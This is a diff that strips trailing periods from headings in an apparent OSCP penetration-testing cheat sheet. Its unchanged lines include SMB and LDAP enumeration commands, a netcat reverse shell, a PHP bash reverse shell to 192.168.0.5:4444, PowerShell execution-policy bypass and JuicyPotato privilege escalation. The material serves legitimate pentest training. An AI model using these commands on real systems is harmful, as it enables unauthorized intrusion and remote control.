@@ -17,17 +17,17 @@ $ gobuster dir -u [target] -w ~/OSCP/SecLists/Discovery/Web-Content/[wordlist]
 
 ### SMB/Samba [139, 445 TCP]
 
-Automated enum.
+Automated enum
 ```
 $ python3 ~/OSCP/Tools/enum4linux-ng/enum4linux-ng.py [target] 
 ```
 
-Check for SMB vulnerabilities.
+Check for SMB vulnerabilities
 ```
 $ nmap --script smb-vuln-* [target]
 ```
 
-Enumerate SMB.
+Enumerate SMB
 ```
 $ smbclient --no-pass -L //10.11.1.31         # list shares
 $ smbclient --no-pass \\\\[target]\\[share]   # connect to a share
@@ -42,7 +42,7 @@ $ smbget -R smb://[host]/share                # recursively get files from targe
 
 https://book.hacktricks.xyz/pentesting/pentesting-ldap
 
-Enumerate LDAP.
+Enumerate LDAP
 ```
 $ nmap -n -sV --script "ldap* and not brute" [target]
 ```
@@ -69,17 +69,17 @@ $ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/pa
 > \\[host]\share\nc.exe [host] [port] -e cmd.exe
 ```
 
-Have a web shell? Check if server can reach you:
+Have a web shell? Check if server can reach you
 ```
 $ sudo tcpdump -i tun0 -n icmp -v
 ```
 
-Execute PowerShell script non-interactively:
+Execute PowerShell script non-interactively
 ```
 $ powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
 ```
 
-Bypass PHP disable functions.
+Bypass PHP disable functions
 ```
 <?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.5/4444 0>&1'"); ?>
 ```
@@ -108,7 +108,7 @@ PS> Get-ChildItem | Get-Acl
 https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c1429e8018211371eec1ad
 
 
-JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled.
+JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
 ```
 > whoami /privs
 > JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
